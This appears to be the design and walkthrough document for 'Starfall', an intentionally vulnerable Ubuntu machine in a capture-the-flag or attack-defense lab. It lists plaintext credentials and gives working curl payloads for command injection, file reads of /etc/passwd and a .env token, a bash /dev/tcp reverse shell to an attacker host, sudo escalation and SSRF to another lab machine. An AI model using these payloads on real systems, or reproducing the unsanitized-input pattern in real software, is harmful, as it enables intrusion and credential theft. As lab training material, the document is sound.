◊# Starfall

> Starfall is a beautiful creation by our systems stewardess Fern. The same way the stars will never fall, neither will Sunspire's most critical services. Starfall is a gateway to much more...

---

## Overview

| Property | Value |
|----------|-------|
| Difficulty | Easy |
| OS | Ubuntu 24.04 |
| Services | SSH, API |
| Initial Access | Command Injection, Weak Password, SSH from Helios |
| Privilege Escalation | None (starfall is sudoer) |
| Lateral Movement | SSRF → Forge |

---

## Users

| Username | Password | Notes |
|----------|----------|-------|
| starfall | starfall | Member of sudo group |
| ops | 9ksP311p | |
| root | qi6AJZin | |

---

## Services

### OpenSSH Server
- Standard SSH service for remote access
- Password authentication enabled

### Flask API (Starfaller)
- External API on `:5000` - Health monitoring
- Internal API on `:5001` - Config display (localhost only)
- Running as `starfall` user via systemd
- Application directory: `/opt/starfall/`

---

## Attack Vectors

### Initial Access

#### Option 1: Command Injection
The `/api/health/history` endpoint uses the `cat` command with unsanitized user input.

1. Enumerate the API:
   ```bash
   curl http://<target_ip>:5000/
   ```
2. Test command injection:
   ```bash
   curl "http://<target_ip>:5000/api/health/history?file=health_history.csv;id"
   ```
3. Read sensitive files:
   ```bash
   curl "http://<target_ip>:5000/api/health/history?file=/etc/passwd"
   ```
4. Establish reverse shell:
   ```bash
   curl "http://<target_ip>:5000/api/health/history?file=;bash+-c+'bash+-i+>%26+/dev/tcp/<attacker_ip>/4444+0>%261'"
   ```

#### Option 2: Weak/Guessable Password
The `starfall` user has a weak password that matches the username.

1. Attempt SSH with guessable credentials:
   ```bash
   ssh starfall@<target_ip>
   # Password: starfall
   ```

#### Option 3: SSH from Helios or Solaris
If you have access to the Helios/Solaris machines, you can SSH into Starfall using the provided id_rsa key.
1. Copy the `id_rsa` key from Helios or Solaris.
2. SSH into Starfall:
   ```bash
   ssh -i id_rsa starfall@<starfall_ip>
   ```

### Privilege Escalation

#### None Required
The `starfall` user is a member of the `sudo` group and can escalate to root.

```bash
sudo -l
sudo su -
```

---

### Lateral Movement

#### SSRF → Forge (Round 2)
The internal API on `:5001` can make authenticated requests to other systems. This can be used to access the Forge machine's API.

1. Use command injection to access the internal API:
   ```bash
   curl "http://<target_ip>:5000/api/health/history?file=;curl+http://127.0.0.1:5001/"
   ```
2. Query the config display endpoint for Forge:
   ```bash
   curl "http://<target_ip>:5000/api/health/history?file=;curl+'http://127.0.0.1:5001/api/config/display?hostname=forge'"
   ```
3. The internal API makes requests with:
   - `User-Agent: STARFALLER`
   - `token` parameter from `.env` file (`STARFALLER_TOKEN=ab5f4cad309`)

4. Read the token from the `.env` file:
   ```bash
   curl "http://<target_ip>:5000/api/health/history?file=/opt/starfall/.env"
   ```

---

## Scoring

### Services
- [ ] API (Flask on :5000)
- [ ] SSH (OpenSSH)

### Control Files
- [ ] `/home/starfall/ctrl.txt`
- [ ] `/opt/starfall/ctrl.txt`

---

## File Locations

| Purpose | Path |
|---------|------|
| Application Directory | /opt/starfall |
| Flask App | /opt/starfall/app.py |
| Systems Config | /opt/starfall/systems.json |
| Environment File | /opt/starfall/.env |
| Health Log | /opt/starfall/health_history.csv |
| Systemd Service | /etc/systemd/system/starfaller.service |

---

## API Endpoints

### External API (`:5000`)

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/` | GET | API index |
| `/api/health/all` | GET | Ping all systems, log results |
| `/api/health/history` | GET | View CSV log (**VULNERABLE**) |
| `/api/health/history?file=<FILE>` | GET | Read arbitrary file via command injection |

### Internal API (`:5001` - localhost only)

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/` | GET | Internal API index |
| `/api/config/display?hostname=<HOST>` | GET | SSRF - fetches from `<IP>:4000/api/info` |

---

## Configuration Files

### systems.json
```json
{
    "systems": [
        {"hostname": "solaris", "ip": "<SOLARIS_IP_ADDRESS>"},
        {"hostname": "forge", "ip": "<FORGE_IP_ADDRESS>"},
        {"hostname": "orbital", "ip": "<ORBITAL_IP_ADDRESS>"},
        {"hostname": "pyre", "ip": "<PYRE_IP_ADDRESS>"},
        {"hostname": "starfall", "ip": "127.0.0.1"}
    ]
}
```

### .env
```
STARFALLER_TOKEN=ab5f4cad309
FLASK_ENV=production
```
